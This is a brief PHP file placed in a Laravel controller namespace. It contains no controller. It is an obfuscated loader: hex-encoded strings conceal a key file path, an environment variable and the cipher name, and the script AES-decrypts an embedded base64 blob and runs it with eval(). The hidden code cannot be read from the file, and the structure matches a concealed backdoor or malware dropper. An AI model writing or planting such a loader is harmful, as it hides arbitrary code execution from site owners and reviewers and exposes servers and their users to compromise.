<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('zJyFhhwThrhlRe7K+uglaw==');

$c=base64_decode(

'oEiAX7jGdQ3Q8vnXKMIs0MAl2EOwJZVHA+1kDIKGfpeSwqURFXs01JLVyCnFReypFqdxTwXlJTSW' .
'mWeo0ZOhSNwXjvfyWpu4w5pcVnPtOUcMge+hU8i1+BL7OF6zegT2fslCLN6n1SdpMQRrs44Nnxc8' .
'YnfAK5jv+/HE73tSWXN/S8R4zmlPBhxRelzWvVenw2Z+ypzAiN/W2/wRBchIkqv9fiDXCKm5vwFi' .
'qoi+dkt0HxMmwF+9e8sj92jAl+hbFHwB0htE8jXv2OdjZk8f40s+PReAl/6KLGLxy4GIu/yIy/1Z' .
'R1G64BpEdNtKXEI0rqxhDXdFgKMLCLrTVAyBigkG9d3It/qnd+XPzBiutCA5D3dXc5Dl4SWop8+g' .
'VZB+Gvr2jE1fHTrNOU978HbcRw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

